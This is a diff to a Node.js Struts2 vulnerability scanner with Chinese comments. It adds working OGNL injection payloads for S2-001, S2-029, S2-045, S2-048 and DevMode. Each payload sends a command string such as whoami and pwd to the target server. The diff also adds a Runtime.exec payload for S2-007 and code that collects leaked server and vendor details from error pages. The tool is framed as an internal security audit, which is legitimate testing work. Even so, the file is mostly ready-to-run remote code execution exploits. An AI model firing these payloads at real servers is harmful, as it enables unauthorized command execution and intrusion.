@@ -10,6 +10,13 @@ var szMyName = 'M.T.X._2017-06-08',
 	g_szCmdW = "echo whoami: && whoami && echo pwd: && pwd && echo cmdend",
 	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/),
 	g_postData = "%{(#nike='multipart/form-data')"
+		// s-045不允许下面的代码
+		// + ".(#_memberAccess['allowStaticMethodAccess']=true)"
+		// + ".(#_memberAccess['acceptProperties']=true)"
+		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
+		// + ".(#_memberAccess['excludedPackageNamePatterns']=true)"
+		// + ".(#_memberAccess['excludedClasses']=true)"
+		+ ".(#rplc=true)"
 		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
 		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
 		+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
@@ -310,26 +317,67 @@ function myLog(a)
 		if(0 < a.length)myLog(a);
 	}
 }
-
-function fnDoBody(body,t)
+g_oRst.struts2 || (g_oRst.struts2 = {});
+function fnDoBody(body,t,rep)
 {
-	body||(body = "");
+	// console.log(t);
+	var oCa = arguments.callee.caller.arguments;
+	if(!rep)rep = oCa[1];
+	// error msg
+	if(oCa[0])console.log(oCa[0]);
+	var repT = oCa[1] || {};
+	
+	// safegene
+	if(repT && repT.headers && repT.headers['safegene_msg'])
+		console.log(decodeURIComponent(repT.headers['safegene_msg']));
+	// else console.log(repT.statusCode + " " + repT.url)
 
+	body||(body = "");
 	if(!body)
 	{
 		// myLog(arguments);
 	}
 	if(!body)return;
 	body = body.trim();
-	if(-1 == body.indexOf("whoami"))return;
+
+	g_oRst.config || (g_oRst.config = {});
+	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
+	{
+		g_oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
+	}
+	// at 
+	if(!g_oRst.config["dev"])
+	{
+		var re = /Exception\s+at ([^\(]+)\(/gmi;
+			re = re.exec(body);
+		if(re && 0 < re.length)
+		{
+			g_oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
+		}
+	}
+	if(!g_oRst.config["x-powered-by"] && rep && rep.headers)
+	{
+		if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
+		{
+			g_oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
+		}
+	}
+	if(!g_oRst.config["server"] && rep && rep.headers)
+	{
+		if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
+		{
+			g_oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
+		}
+	}
+
+	if(!body || -1 == body.indexOf("whoami"))return;
 	console.log("发现高危漏洞：" + t);
+	if(-1 < t.indexOf("s2-001"))console.log(body)
 	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
 	
 	if(0 < i) body = body.substr(0, i).trim();
-	
 	// console.log(body);
-	g_oRst.struts2 || (g_oRst.struts2 = {});
-	var oT = g_oRst.struts2 = {},s1 = String(body).split(/\n/);
+	var oT = g_oRst.struts2,s1 = String(body).split(/\n/);
 	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
 	if(-1 < body.indexOf("root") && !oT["root"])
 		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
@@ -339,7 +387,6 @@ function fnDoBody(body,t)
 		oT["CurDir"] = {des:"当前中间件目录","path":(3 < s1.length ? s1[3] : s1[1]).trim()};
 }
 
-
 function doStruts2_045(url, fnCbk)
 {
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
@@ -348,7 +395,8 @@ function doStruts2_045(url, fnCbk)
 	    ,headers:
 	    {
 	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
-	    	"Content-Type":encodeURIComponent(g_postData)
+	    	// encodeURIComponent不能编码 2017-07-18
+	    	"Content-Type":g_postData
 	    }}
 	  , function (error, response, body){
 	  		if(body)
@@ -362,12 +410,27 @@ function doStruts2_045(url, fnCbk)
 // S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
 function doStruts2_DevMode(url)
 {
-	request({method: 'POST',uri: url + "?debug=browser&object=" + encodeURIComponent(g_postData)},
+	// debug=browser&object=
+	// debug=command&expression=
+	request({method: 'POST',uri: url + "?debug=browser&expression=" + encodeURIComponent(g_postData) + ":xx.toString.json&ok=1"},
     	function(e,r,b)
     {
     	fnDoBody(b,"s2-DevMode");
     });
 }
+// s2-007 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '
+
+
+function doStruts2_001(url)
+{
+	// 如果编码encodeURIComponent 就会导致不执行？
+	request({method: 'POST',uri: url + "?name=" + (g_postData)},
+    	function(e,r,b)
+    {
+    	fnDoBody(b,"s2-001,s2-012");
+    });
+}
+
 //
 function doStruts2_019(url, fnCbk)
 {
@@ -389,6 +452,43 @@ function doStruts2_019(url, fnCbk)
 	  );
 }
 
+function doStruts2_029(url, fnCbk)
+{
+	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
+	//  && cat #curPath/WEB-INF/jdbc.propertis
+	
+	var s = 
+		// s-045不允许下面的代码
+		".(#_memberAccess['allowStaticMethodAccess']=true)"
+		+ ".(#_memberAccess['acceptProperties']=true)"
+		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
+		+ ".(#_memberAccess['excludedPackageNamePatterns']=true)"
+		+ ".(#_memberAccess['excludedClasses']=true)"
+		// s2-048不能加下面的代码
+		+ ".(#_memberAccess['allowPrivateAccess']=true)"
+		+ ".(#_memberAccess['allowProtectedAccess']=true)"
+		+ ".(#_memberAccess['acceptProperties']=true)"
+		+ ".(#_memberAccess['allowPackageProtectedAccess']=true)",
+		szDPt = g_postData.replace(/\.\(#rplc=true\)/, s);
+
+		
+
+	request({method: 'POST',uri: url,
+		"formData":{"message":encodeURIComponent(szDPt)}
+	    ,headers:
+	    {
+	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+	    	"Content-Type":"application/x-www-form-urlencoded"
+	    }}
+	  , function (error, response, body){
+	  		if(body)
+	  		{
+	  			fnDoBody(body,"s2-029");
+	  		}
+	    }
+	  );
+}
+
 // 测试所有，便于更改url重复测试
 function fnTestAll()
 {
@@ -403,13 +503,16 @@ function fnTestAll()
 
 if(0 < a.length)
 {
+	doStruts2_001(url);
 	doStruts2_016(url);
 	doStruts2_019(url);
+	doStruts2_029(url);
 	doStruts2_032(url);
 	doStruts2_033(url);
 	doStruts2_037(url);
 	doStruts2_045(url);
-	doStruts2_046(url);
+	// 文件上传测试
+	// doStruts2_046(url);
 	doStruts2_048(url);
 	doStruts2_DevMode(url);
 	
@@ -420,3 +523,10 @@ process.on('exit', (code) =>
 {
 	console.log(JSON.stringify(g_oRst,null,' '));
 });
+
+/*
+s2-045
+node checkUrl.js http://192.168.24.67:22245/
+s2-048
+node checkUrl.js http://192.168.24.67:22244/integration/saveGangster.action
+*/
